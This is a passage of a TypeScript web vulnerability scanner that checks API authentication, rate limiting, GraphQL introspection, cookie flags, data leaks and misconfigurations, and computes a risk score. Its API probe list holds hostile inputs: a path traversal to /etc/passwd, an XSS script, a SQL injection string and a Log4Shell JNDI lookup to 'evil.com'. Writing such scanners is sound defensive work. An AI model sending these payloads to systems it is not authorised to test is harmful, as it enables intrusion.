                severity: 'HIGH' as Severity,
                passed: false,
                details: `API endpoint ${endpoint} returns sensitive data fields: ${foundSensitive.join(', ')}. This data should not be exposed without proper authorization.`,
              })
            }
            
            // Check if authentication is missing (no 401/403)
            if (response.status === 200 && !response.headers.get('www-authenticate')) {
              findings.push({
                type: 'OTHER' as FindingType,
                title: `Missing authentication on API route: ${endpoint}`,
                severity: 'HIGH' as Severity,
                passed: false,
                details: `API endpoint ${endpoint} is accessible without authentication. This allows unauthorized access to API resources.`,
              })
            }
          }
        }

        // Test 2: Check for unvalidated inputs (test with malicious payloads)
        try {
          const maliciousPayloads = [
            { param: 'id', value: '../../etc/passwd' },
            { param: 'id', value: '<script>alert(1)</script>' },
            { param: 'id', value: "1' OR '1'='1" },
            { param: 'id', value: '${jndi:ldap://evil.com/a}' },
          ]

          for (const payload of maliciousPayloads) {
            const testUrlWithParam = `${testUrl}?${payload.param}=${encodeURIComponent(payload.value)}`
            const testResponse = await fetch(testUrlWithParam, {
              method: 'GET',
              headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
              redirect: 'follow',
            })

            if (testResponse.ok) {
              const responseText = await testResponse.text()
              
              // Check if payload is reflected without validation
              if (responseText.includes(payload.value) && !responseText.includes(encodeURIComponent(payload.value))) {
                findings.push({
                  type: 'OTHER' as FindingType,
                  title: `Unvalidated input on API: ${endpoint}`,
                  severity: 'MEDIUM' as Severity,
                  passed: false,
                  details: `API endpoint ${endpoint} appears to accept and reflect unvalidated input. This can lead to injection attacks.`,
                })
                break
              }
            }
          }
        } catch (error) {
          // Ignore errors
        }

        // Test 3: Check for rate limiting
        try {
          const requests = []
          for (let i = 0; i < 20; i++) {
            requests.push(
              fetch(testUrl, {
                method: 'GET',
                headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
                redirect: 'follow',
              })
            )
          }
          
          const responses = await Promise.all(requests)
          let rateLimitCount = 0
          let successCount = 0
          
          for (const res of responses) {
            if (res.status === 429 || res.status === 503) {
              rateLimitCount++
            } else if (res.ok) {
              successCount++
            }
          }
          
          // If most requests succeed without rate limiting
          if (successCount >= 15 && rateLimitCount === 0) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `No rate limiting on API: ${endpoint}`,
              severity: 'MEDIUM' as Severity,
              passed: false,
              details: `API endpoint ${endpoint} does not appear to have rate limiting. This allows abuse and potential DoS attacks.`,
            })
          }
        } catch (error) {
          // Ignore errors
        }

        // Test 4: Check for GraphQL introspection
        if (endpoint.includes('graphql')) {
          try {
            const graphqlQuery = {
              query: `
                {
                  __schema {
                    types {
                      name
                    }
                  }
                }
              `
            }

            const graphqlResponse = await fetch(testUrl, {
              method: 'POST',
              headers: {
                'User-Agent': 'VulnerabilityScanner/1.0',
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(graphqlQuery),
              redirect: 'follow',
            })

            if (graphqlResponse.ok) {
              const graphqlJson = await graphqlResponse.json()
              
              if (graphqlJson.data && graphqlJson.data.__schema) {
                findings.push({
                  type: 'OTHER' as FindingType,
                  title: `GraphQL introspection enabled: ${endpoint}`,
                  severity: 'MEDIUM' as Severity,
                  passed: false,
                  details: `GraphQL endpoint ${endpoint} has introspection enabled. This exposes the entire schema structure, which can help attackers understand the API structure and find vulnerabilities.`,
                })
              }
            }
          } catch (error) {
            // Ignore errors
          }
        }
      } catch (error) {
        // Endpoint not accessible, ignore
      }
    }

    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No API vulnerabilities detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No common API vulnerabilities were detected. Note: Full API testing requires authenticated access and comprehensive endpoint discovery.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkCookieSessionIssues(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
      redirect: 'follow',
    })

    const setCookieHeader = response.headers.get('set-cookie')
    
    if (setCookieHeader) {
      const cookies = setCookieHeader.split(',').map(c => c.trim())
      
      for (const cookie of cookies) {
        const cookieLower = cookie.toLowerCase()
        const issues: string[] = []
        
        // Check for HttpOnly flag
        if (!cookieLower.includes('httponly')) {
          issues.push('HttpOnly flag missing')
        }
        
        // Check for Secure flag (only if HTTPS)
        const urlObj = new URL(url)
        if (urlObj.protocol === 'https:') {
          if (!cookieLower.includes('secure')) {
            issues.push('Secure flag missing (HTTPS site)')
          }
        }
        
        // Check for SameSite attribute
        if (!cookieLower.includes('samesite')) {
          issues.push('SameSite attribute missing')
        } else {
          // Check SameSite value
          const sameSiteMatch = cookie.match(/samesite=([^;]+)/i)
          if (sameSiteMatch) {
            const sameSiteValue = sameSiteMatch[1].toLowerCase()
            if (sameSiteValue !== 'strict' && sameSiteValue !== 'lax') {
              issues.push(`SameSite set to '${sameSiteValue}' (should be 'Strict' or 'Lax')`)
            }
          }
        }
        
        // Extract cookie name for reporting
        const cookieNameMatch = cookie.match(/^([^=]+)=/)
        const cookieName = cookieNameMatch ? cookieNameMatch[1] : 'unknown'
        
        if (issues.length > 0) {
          findings.push({
            type: 'OTHER' as FindingType,
            title: `Cookie security issues: ${cookieName}`,
            severity: 'MEDIUM' as Severity,
            passed: false,
            details: `Cookie "${cookieName}" has security issues: ${issues.join(', ')}. This can lead to cookie theft via XSS or man-in-the-middle attacks.`,
          })
        }
      }
    }

    // Also check cookies in response headers (some servers set multiple cookies)
    const allCookies = response.headers.get('set-cookie')
    if (allCookies) {
      // Parse all cookies from the header
      const cookieList = allCookies.split(',').map(c => {
        // Handle cookies that might be split incorrectly
        const parts = c.split(';')
        return parts[0].trim()
      })
      
      // Check if session cookies are present
      const sessionCookies = cookieList.filter(c => 
        c.toLowerCase().includes('session') || 
        c.toLowerCase().includes('sess') || 
        c.toLowerCase().includes('token') ||
        c.toLowerCase().includes('auth')
      )
      
      if (sessionCookies.length > 0) {
        // Additional check: verify all session cookies have proper flags
        for (const sessionCookie of sessionCookies) {
          const cookieLower = sessionCookie.toLowerCase()
          const sessionIssues: string[] = []
          
          if (!cookieLower.includes('httponly')) {
            sessionIssues.push('HttpOnly missing')
          }
          
          const urlObj = new URL(url)
          if (urlObj.protocol === 'https:' && !cookieLower.includes('secure')) {
            sessionIssues.push('Secure missing')
          }
          
          if (!cookieLower.includes('samesite')) {
            sessionIssues.push('SameSite missing')
          }
          
          if (sessionIssues.length > 0) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `Session cookie security issues detected`,
              severity: 'HIGH' as Severity,
              passed: false,
              details: `Session cookie has security issues: ${sessionIssues.join(', ')}. Session cookies must have HttpOnly, Secure (on HTTPS), and SameSite attributes to prevent theft.`,
            })
          }
        }
      }
    }

    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No cookie security issues detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'Cookies appear to be properly configured with HttpOnly, Secure (where applicable), and SameSite attributes.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkDataExposure(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
      redirect: 'follow',
    })

    const html = await response.text()
    const headers = response.headers
    
    // Check 1: Email leaks
    const emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g
    const emailMatches = html.match(emailPattern)
    
    if (emailMatches && emailMatches.length > 0) {
      // Filter out common false positives (example emails, placeholders)
      const realEmails = emailMatches.filter(email => 
        !email.includes('example.com') &&
        !email.includes('test.com') &&
        !email.includes('placeholder') &&
        !email.includes('your-email') &&
        !email.includes('@domain') &&
        !email.includes('@example')
      )
      
      if (realEmails.length > 0) {
        const uniqueEmails = [...new Set(realEmails)]
        findings.push({
          type: 'OTHER' as FindingType,
          title: `Email addresses exposed: ${uniqueEmails.length} found`,
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: `Email addresses are exposed in the response: ${uniqueEmails.slice(0, 5).join(', ')}${uniqueEmails.length > 5 ? '...' : ''}. This can lead to spam and phishing attacks.`,
        })
      }
    }

    // Check 2: Phone number leaks
    const phonePatterns = [
      /\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9}/g, // International format
      /\(\d{3}\)\s?\d{3}[-.\s]?\d{4}/g, // US format (123) 456-7890
      /\d{3}[-.\s]?\d{3}[-.\s]?\d{4}/g, // US format 123-456-7890
      /\+\d{10,15}/g, // International with country code
    ]
    
    const phoneMatches: string[] = []
    for (const pattern of phonePatterns) {
      const matches = html.match(pattern)
      if (matches) {
        phoneMatches.push(...matches)
      }
    }
    
    if (phoneMatches.length > 0) {
      // Filter out common false positives
      const realPhones = phoneMatches.filter(phone => 
        !phone.includes('000-000') &&
        !phone.includes('123-456') &&
        !phone.includes('555-') &&
        phone.replace(/\D/g, '').length >= 10 // At least 10 digits
      )
      
      if (realPhones.length > 0) {
        const uniquePhones = [...new Set(realPhones)]
        findings.push({
          type: 'OTHER' as FindingType,
          title: `Phone numbers exposed: ${uniquePhones.length} found`,
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: `Phone numbers are exposed in the response: ${uniquePhones.slice(0, 3).join(', ')}${uniquePhones.length > 3 ? '...' : ''}. This can lead to spam and social engineering attacks.`,
        })
      }
    }

    // Check 3: Internal IP disclosure
    const internalIPPatterns = [
      /(?:^|\s)(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3})/g, // 10.0.0.0/8
      /(?:^|\s)(?:172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})/g, // 172.16.0.0/12
      /(?:^|\s)(?:192\.168\.\d{1,3}\.\d{1,3})/g, // 192.168.0.0/16
      /(?:^|\s)(?:127\.\d{1,3}\.\d{1,3}\.\d{1,3})/g, // 127.0.0.0/8 (localhost)
      /(?:^|\s)(?:169\.254\.\d{1,3}\.\d{1,3})/g, // 169.254.0.0/16 (link-local)
    ]
    
    const internalIPs: string[] = []
    for (const pattern of internalIPPatterns) {
      const matches = html.match(pattern)
      if (matches) {
        internalIPs.push(...matches.map(ip => ip.trim()))
      }
    }
    
    // Also check headers for internal IPs
    for (const [headerName, headerValue] of headers.entries()) {
      for (const pattern of internalIPPatterns) {
        const matches = headerValue.match(pattern)
        if (matches) {
          internalIPs.push(...matches.map(ip => ip.trim()))
        }
      }
    }
    
    if (internalIPs.length > 0) {
      const uniqueIPs = [...new Set(internalIPs)]
      findings.push({
        type: 'OTHER' as FindingType,
        title: `Internal IP addresses exposed: ${uniqueIPs.length} found`,
        severity: 'HIGH' as Severity,
        passed: false,
        details: `Internal/private IP addresses are exposed: ${uniqueIPs.slice(0, 5).join(', ')}${uniqueIPs.length > 5 ? '...' : ''}. This can reveal network topology and help attackers map internal infrastructure.`,
      })
    }

    // Check 4: Generic server error messages and stack traces
    const errorPatterns = [
      /stack trace/i,
      /exception in/i,
      /error occurred/i,
      /fatal error/i,
      /warning:.*?in.*?on line/i,
      /file:.*?line:\s*\d+/i,
      /at\s+.*?\(.*?:\d+:\d+\)/g, // Stack trace format
      /traceback.*?file.*?line/i,
      /java\.lang\./i,
      /python.*?traceback/i,
      /\.py.*?line \d+/i,
      /\.js.*?line \d+/i,
      /\.php.*?on line \d+/i,
      /database error/i,
      /sql.*?error/i,
      /connection.*?failed/i,
      /access denied/i,
      /permission denied/i,
    ]
    
    const errorMatches: string[] = []
    for (const pattern of errorPatterns) {
      if (pattern.test(html)) {
        const matches = html.match(pattern)
        if (matches) {
          errorMatches.push(...matches)
        }
      }
    }
    
    if (errorMatches.length > 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'Server error messages or stack traces exposed',
        severity: 'HIGH' as Severity,
        passed: false,
        details: `Server error messages, stack traces, or debug information are exposed in the response. This can reveal sensitive information about the application structure, file paths, database schemas, and internal errors.`,
      })
    }

    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No data exposure detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No obvious email addresses, phone numbers, internal IPs, or error messages were detected in the response.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkMisconfigurations(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
      redirect: 'follow',
    })

    const headers = response.headers
    const html = await response.text()
    const htmlLower = html.toLowerCase()
    
    // Check 1: Caching sensitive data
    const cacheControl = headers.get('cache-control')
    const pragma = headers.get('pragma')
    const expires = headers.get('expires')
    
    // Check if sensitive content is being cached
    const sensitiveIndicators = [
      'password',
      'token',
      'session',
      'auth',
      'secret',
      'api_key',
      'credit_card',
      'ssn',
    ]
    
    const hasSensitiveContent = sensitiveIndicators.some(indicator => 
      htmlLower.includes(indicator)
    )
    
    if (hasSensitiveContent) {
      // Check if caching is allowed
      if (!cacheControl || (!cacheControl.includes('no-cache') && !cacheControl.includes('no-store') && !cacheControl.includes('private'))) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'Sensitive data may be cached',
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: `Response contains sensitive content but Cache-Control headers may allow caching. Use 'Cache-Control: no-store, no-cache, private' for sensitive data.`,
        })
      }
    }

    // Check 2: Missing security patches (check for known vulnerable versions in headers)
    const server = headers.get('server')
    if (server) {
      // Check for known vulnerable server versions
      const serverLower = server.toLowerCase()
      
      // Check for very old versions that definitely need patching
      if (serverLower.includes('apache/2.2')) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'Missing security patches: Apache 2.2 is EOL',
          severity: 'HIGH' as Severity,
          passed: false,
          details: 'Apache 2.2 reached end-of-life and no longer receives security patches. Upgrade to Apache 2.4 immediately.',
        })
      }
      
      if (serverLower.includes('nginx/1.') && parseFloat(server.match(/nginx\/([\d.]+)/i)?.[1] || '0') < 1.20) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'Missing security patches: Outdated Nginx version',
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: 'Nginx version may be missing security patches. Ensure you are running the latest stable version with all security updates applied.',
        })
      }
    }

    // Check 3: Public test environments
    const testEnvironmentIndicators = [
      'test environment',
      'staging environment',
      'development environment',
      'dev environment',
      'testing mode',
      'debug mode',
      'this is a test',
      'staging server',
      'dev server',
      'test server',
      'localhost',
      '127.0.0.1',
      'test.example.com',
      'staging.example.com',
      'dev.example.com',
    ]
    
    const urlLower = url.toLowerCase()
    const hasTestIndicator = testEnvironmentIndicators.some(indicator => 
      urlLower.includes(indicator) || htmlLower.includes(indicator)
    )
    
    if (hasTestIndicator) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'Public test/staging environment detected',
        severity: 'HIGH' as Severity,
        passed: false,
        details: 'Test, staging, or development environment is publicly accessible. These environments often contain test data, debug information, and may have weaker security controls. Restrict access to authorized personnel only.',
      })
    }

    // Check 4: Misconfigured Cloudflare/WAF
    const cfRay = headers.get('cf-ray')
    const cfCountry = headers.get('cf-ipcountry')
    const serverHeader = headers.get('server')
    
    // Check if Cloudflare is being used
    if (cfRay || cfCountry || serverHeader?.toLowerCase().includes('cloudflare')) {
      // Check for missing security headers that Cloudflare should provide
      const securityHeaders = [
        'cf-ray',
        'cf-ipcountry',
      ]
      
      // Check if Cloudflare is properly configured
      // Missing CF-Connecting-IP might indicate misconfiguration
      const cfConnectingIP = headers.get('cf-connecting-ip')
      if (!cfConnectingIP && cfRay) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'Cloudflare configuration issue: CF-Connecting-IP missing',
          severity: 'LOW' as Severity,
          passed: false,
          details: 'Cloudflare is detected but CF-Connecting-IP header is missing. This may indicate misconfiguration or that the origin server is not properly configured to use Cloudflare headers.',
        })
      }
      
      // Check for exposed server information (should be hidden behind Cloudflare)
      if (serverHeader && !serverHeader.toLowerCase().includes('cloudflare')) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'Server information exposed behind Cloudflare',
          severity: 'LOW' as Severity,
          passed: false,
          details: `Server header "${serverHeader}" is exposed even though Cloudflare is in use. Consider hiding server information or using Cloudflare's "Hide Server Header" feature.`,
        })
      }
    }
    
    // Check for WAF indicators
    const wafHeaders = [
      'x-waf-status',
      'x-sucuri-id',
      'x-sucuri-cache',
      'x-akamai-request-id',
      'x-aws-request-id',
    ]
    
    const hasWAF = wafHeaders.some(header => headers.has(header))
    
    if (hasWAF) {
      // Check if WAF is properly configured (basic check)
      // If WAF is present but security headers are missing, it might be misconfigured
      const criticalSecurityHeaders = [
        'x-frame-options',
        'x-content-type-options',
        'strict-transport-security',
      ]
      
      const missingHeaders = criticalSecurityHeaders.filter(header => !headers.has(header))
      
      if (missingHeaders.length > 0) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'WAF detected but security headers missing',
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: `WAF is detected but critical security headers are missing: ${missingHeaders.join(', ')}. Ensure WAF is properly configured to add security headers.`,
        })
      }
    }

    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No misconfigurations detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No obvious misconfigurations were detected. Ensure caching policies, security patches, and WAF configurations are properly maintained.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

function calculateRiskScore(findings: Finding[]): { score: number; level: 'LOW' | 'MEDIUM' | 'HIGH' } {
  let score = 0

  for (const finding of findings) {
    if (!finding.passed) {
      // Updated scoring system with new checks
      if (finding.type === 'HEADER') {
        if (finding.severity === 'HIGH') {
          if (finding.title.includes('Content-Security-Policy') && finding.title.includes('Weak')) {
            score += 4 // Weak CSP
          } else {
            score += 3 // Missing critical header
          }
        } else if (finding.severity === 'MEDIUM') {
          score += 2
        } else if (finding.severity === 'LOW') {
          score += 1
        }
      } else if (finding.type === 'SSL') {
        if (finding.severity === 'HIGH') {
          score += 5 // No HTTPS
        } else {
          score += 2
        }
      } else if (finding.type === 'PORT') {
        if (finding.severity === 'HIGH') {
          score += 3 // Suspicious open ports
        }
      } else if (finding.type === 'XSS') {
        if (finding.severity === 'HIGH') {
          // Clear XSS reflection
          if (finding.title.includes('reflected XSS')) {
            score += 6
          } else {
            score += 4 // XSS surface indicators
          }
        }
      } else {
        // OTHER type - includes new checks
        if (finding.title.includes('Directory listing')) {
          score += 3
        } else if (finding.title.includes('HTTP method enabled')) {
          score += 4 // Unsafe methods (PUT/DELETE)
        } else if (finding.title.includes('Mixed content')) {
          score += 3
        } else if (finding.title.includes('SQL error')) {
          score += 5 // SQL errors exposure
        } else if (finding.title.includes('command injection')) {
          score += 7 // Command injection - critical
        } else if (finding.title.includes('HTML injection')) {
          score += 6 // HTML injection - high risk
        } else if (finding.title.includes('Header injection')) {
          score += 6 // Header injection - high risk
        } else if (finding.title.includes('Permissions-Policy') && !finding.passed) {
          score += 2 // Missing Permissions-Policy
        } else if (finding.title.includes('Weak TLS versions')) {
          score += 5 // Weak TLS versions
        } else if (finding.title.includes('No HTTPS redirect')) {
          score += 3 // No HTTPS redirect
        } else if (finding.title.includes('.env') && !finding.passed) {
          score += 6 // .env file exposed - critical
        } else if (finding.title.includes('.git') && !finding.passed) {
          score += 6 // .git exposed - critical
        } else if (finding.title.includes('Backup file') && !finding.passed) {
          score += 4 // Backup files exposed
        } else if (finding.title.includes('phpinfo') && !finding.passed) {
          score += 5 // phpinfo exposed
        } else if (finding.title.includes('Config file') && !finding.passed) {
          score += 3 // Config files exposed
        } else if ((finding.title.includes('Exposed admin panel') || finding.title.includes('Admin panel')) && !finding.passed) {
          score += 6 // Exposed admin panel
        } else if ((finding.title.includes('Weakly protected') || finding.title.includes('API endpoint')) && !finding.passed) {
          score += 4 // Weakly protected API
        } else if ((finding.title.includes('Debug endpoint') || finding.title.includes('Development endpoint')) && !finding.passed) {
          score += 5 // Debug endpoints exposed
        } else if (finding.title.includes('No rate limiting') && !finding.passed) {
          score += 5 // No rate limiting - allows brute force
        } else if (finding.title.includes('Weak passwords') && !finding.passed) {
          score += 3 // Weak password policy
        } else if (finding.title.includes('Missing brute-force protection') && !finding.passed) {
          score += 3 // Missing brute-force protection
        } else if (finding.title.includes('Broken session management') && !finding.passed) {
          score += 6 // Broken session management - critical
        } else if (finding.title.includes('JWT exposed') && !finding.passed) {
          score += 5 // JWT exposed - high risk
        } else if (finding.title.includes('JWT may be guessable') && !finding.passed) {
          score += 4 // Guessable JWT
        } else if (finding.title.includes('IDOR') && !finding.passed) {
          score += 6 // IDOR vulnerability - critical
        } else if (finding.title.includes('CORS') && finding.title.includes('wildcard') && !finding.passed) {
          score += 4 // CORS wildcard - high risk
        } else if (finding.title.includes('CORS') && finding.title.includes('Credentials') && !finding.passed) {
          score += 5 // CORS credentials with wildcard - critical
        } else if (finding.title.includes('CORS') && finding.title.includes('Unsafe methods') && !finding.passed) {
          score += 3 // Unsafe CORS methods
        } else if (finding.title.includes('Outdated') && finding.title.includes('version') && !finding.passed) {
          score += 4 // Outdated server/framework version
        } else if (finding.title.includes('WordPress') || finding.title.includes('Drupal') || finding.title.includes('Joomla')) {
          score += 1 // CMS detected - reminder to keep updated
        } else if (finding.title.includes('version exposed') && !finding.passed) {
          score += 2 // Version information exposed
        } else if (finding.title.includes('SSH key file exposed') && !finding.passed) {
          score += 8 // SSH key exposed - critical
        } else if (finding.title.includes('SSH configuration') && !finding.passed) {
          score += 6 // SSH config exposed - high risk
        } else if (finding.title.includes('Missing authentication on API') && !finding.passed) {
          score += 6 // Missing API authentication - critical
        } else if (finding.title.includes('Sensitive data exposure in API') && !finding.passed) {
          score += 5 // Sensitive data in API - high risk
        } else if (finding.title.includes('Unvalidated input on API') && !finding.passed) {
          score += 4 // Unvalidated API input
        } else if (finding.title.includes('No rate limiting on API') && !finding.passed) {
          score += 3 // No API rate limiting
        } else if (finding.title.includes('GraphQL introspection enabled') && !finding.passed) {
          score += 3 // GraphQL introspection
        } else if (finding.title.includes('Session cookie security issues') && !finding.passed) {
          score += 5 // Session cookie issues - high risk
        } else if (finding.title.includes('Cookie security issues') && !finding.passed) {
          score += 3 // Cookie security issues
        } else if (finding.title.includes('Email addresses exposed') && !finding.passed) {
          score += 2 // Email leaks
        } else if (finding.title.includes('Phone numbers exposed') && !finding.passed) {
          score += 2 // Phone number leaks
        } else if (finding.title.includes('Internal IP addresses exposed') && !finding.passed) {
          score += 4 // Internal IP disclosure - high risk
        } else if (finding.title.includes('Server error messages') && !finding.passed) {
          score += 4 // Error messages/stack traces - high risk
        } else if (finding.title.includes('Sensitive data may be cached') && !finding.passed) {
          score += 3 // Caching sensitive data
        } else if (finding.title.includes('Missing security patches') && !finding.passed) {
          score += 5 // Missing security patches - critical
        } else if (finding.title.includes('Public test/staging environment') && !finding.passed) {
          score += 5 // Public test environment - high risk
        } else if (finding.title.includes('Cloudflare') || finding.title.includes('WAF')) {
          score += 1 // WAF/Cloudflare misconfiguration - low risk
        } else if (finding.severity === 'HIGH') {
          score += 3
        } else if (finding.severity === 'MEDIUM') {
          score += 2
        } else if (finding.severity === 'LOW') {
          score += 1
        } else if (finding.severity === 'INFO' && (
          finding.title.includes('security.txt') ||
          finding.title.includes('Server header') ||
          finding.title.includes('X-Powered-By')
        )) {
          score += 1 // Tech fingerprinting / missing security.txt
        }
      }
    }
  }

  const numericScore = Math.round(score)
  
  // Updated risk level mapping: 0-4 LOW, 5-9 MEDIUM, 10+ HIGH
  let level: 'LOW' | 'MEDIUM' | 'HIGH'
  if (numericScore <= 4) {
    level = 'LOW'
  } else if (numericScore <= 9) {
    level = 'MEDIUM'
  } else {
    level = 'HIGH'
  }

  return { score: numericScore, level }
}

export async function scanUrl(url: string, options: ScanOptions = {}): Promise<ScanResult> {
  const startTime = Date.now()
  const { scanType = 'STANDARD', customChecks = [], onProgress } = options
  
  // Ensure URL has protocol
  let targetUrl = url
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    targetUrl = `https://${url}`
  }

  // Define check groups based on scan type
  const checkGroups: Record<ScanType, string[]> = {
    QUICK: [
      'headers',
      'ssl',
      'xss',
      'dataExposure',
    ],
    STANDARD: [
      'headers',
      'ssl',
      'port',
      'xss',
      'directory',
      'httpMethod',
      'mixedContent',
      'securityTxt',
      'sqliXssProbe',
      'techFingerprint',
      'injection',
      'sensitiveFiles',
      'exposedEndpoints',
      'cors',
      'cookie',
      'dataExposure',
      'misconfig',
    ],
    DEEP: [
      'headers',
      'ssl',
      'port',
      'xss',
      'directory',
      'httpMethod',
      'mixedContent',
      'securityTxt',
      'sqliXssProbe',
      'techFingerprint',
      'injection',
      'sensitiveFiles',
      'exposedEndpoints',
      'auth',
      'cors',
      'serverFramework',
      'network',
      'api',
      'cookie',
      'dataExposure',
      'misconfig',
    ],
    CUSTOM: customChecks.length > 0 ? customChecks : [
      'headers',
      'ssl',
      'xss',
    ],
  }

  const selectedChecks = checkGroups[scanType]
  const totalChecks = selectedChecks.length
  let completedChecks = 0

  const updateProgress = (checkName: string) => {
    completedChecks++
    const progress = Math.round((completedChecks / totalChecks) * 100)
    if (onProgress) {
      onProgress(progress, checkName)
    }
  }

  // Run checks based on scan type
  const checkPromises: Promise<Finding[]>[] = []
  const checkNames: string[] = []

  if (selectedChecks.includes('headers')) {
    checkPromises.push(checkHeaders(targetUrl).then(r => { updateProgress('Security Headers'); return r }))
    checkNames.push('headers')
  }
  if (selectedChecks.includes('ssl')) {
    checkPromises.push(checkSSL(targetUrl).then(r => { updateProgress('SSL/TLS'); return r }))
    checkNames.push('ssl')
  }
  if (selectedChecks.includes('port')) {
    checkPromises.push(checkPorts(targetUrl).then(r => { updateProgress('Port Scanning'); return r }))
    checkNames.push('port')
  }
  if (selectedChecks.includes('xss')) {
    checkPromises.push(checkXSSSurface(targetUrl).then(r => { updateProgress('XSS Detection'); return r }))
    checkNames.push('xss')
  }
  if (selectedChecks.includes('directory')) {
    checkPromises.push(checkDirectoryListing(targetUrl).then(r => { updateProgress('Directory Listing'); return r }))
    checkNames.push('directory')
  }
  if (selectedChecks.includes('httpMethod')) {
    checkPromises.push(checkHTTPMethods(targetUrl).then(r => { updateProgress('HTTP Methods'); return r }))
    checkNames.push('httpMethod')
  }
  if (selectedChecks.includes('mixedContent')) {
    checkPromises.push(checkMixedContent(targetUrl).then(r => { updateProgress('Mixed Content'); return r }))
    checkNames.push('mixedContent')
  }
  if (selectedChecks.includes('securityTxt')) {
    checkPromises.push(checkSecurityTxt(targetUrl).then(r => { updateProgress('Security.txt'); return r }))
    checkNames.push('securityTxt')
  }
  if (selectedChecks.includes('sqliXssProbe')) {
    checkPromises.push(checkSQLiXSSProbe(targetUrl).then(r => { updateProgress('SQLi/XSS Probes'); return r }))
    checkNames.push('sqliXssProbe')
  }
  if (selectedChecks.includes('techFingerprint')) {
    checkPromises.push(checkTechFingerprinting(targetUrl).then(r => { updateProgress('Tech Fingerprinting'); return r }))
    checkNames.push('techFingerprint')
  }
  if (selectedChecks.includes('injection')) {
    checkPromises.push(checkInjectionVulnerabilities(targetUrl).then(r => { updateProgress('Injection Vulnerabilities'); return r }))
    checkNames.push('injection')
  }
  if (selectedChecks.includes('sensitiveFiles')) {
    checkPromises.push(checkSensitiveFiles(targetUrl).then(r => { updateProgress('Sensitive Files'); return r }))
    checkNames.push('sensitiveFiles')
  }
  if (selectedChecks.includes('exposedEndpoints')) {
    checkPromises.push(checkExposedEndpoints(targetUrl).then(r => { updateProgress('Exposed Endpoints'); return r }))
    checkNames.push('exposedEndpoints')
  }
  if (selectedChecks.includes('auth')) {
    checkPromises.push(checkAuthVulnerabilities(targetUrl).then(r => { updateProgress('Authentication'); return r }))
    checkNames.push('auth')
  }
  if (selectedChecks.includes('cors')) {
    checkPromises.push(checkCORSMisconfigurations(targetUrl).then(r => { updateProgress('CORS Configuration'); return r }))
    checkNames.push('cors')
  }
  if (selectedChecks.includes('serverFramework')) {
    checkPromises.push(checkServerFrameworkVulnerabilities(targetUrl).then(r => { updateProgress('Server/Framework'); return r }))
    checkNames.push('serverFramework')
  }
  if (selectedChecks.includes('network')) {
    checkPromises.push(checkNetworkVulnerabilities(targetUrl).then(r => { updateProgress('Network Security'); return r }))
    checkNames.push('network')
  }
  if (selectedChecks.includes('api')) {
    checkPromises.push(checkAPIVulnerabilities(targetUrl).then(r => { updateProgress('API Security'); return r }))
    checkNames.push('api')
  }
  if (selectedChecks.includes('cookie')) {
    checkPromises.push(checkCookieSessionIssues(targetUrl).then(r => { updateProgress('Cookie/Session'); return r }))
    checkNames.push('cookie')
  }
  if (selectedChecks.includes('dataExposure')) {
    checkPromises.push(checkDataExposure(targetUrl).then(r => { updateProgress('Data Exposure'); return r }))
    checkNames.push('dataExposure')
  }
  if (selectedChecks.includes('misconfig')) {
    checkPromises.push(checkMisconfigurations(targetUrl).then(r => { updateProgress('Misconfigurations'); return r }))
    checkNames.push('misconfig')
  }

  // Run all selected checks
  const allFindingsArrays = await Promise.all(checkPromises)
  
  // Flatten all findings
  const allFindings = allFindingsArrays.flat()
  
  const { score, level } = calculateRiskScore(allFindings)
  const duration = Math.round((Date.now() - startTime) / 1000)

  return {
    findings: allFindings,
    riskScore: score,
    riskLevel: level,
    duration,
  }
}
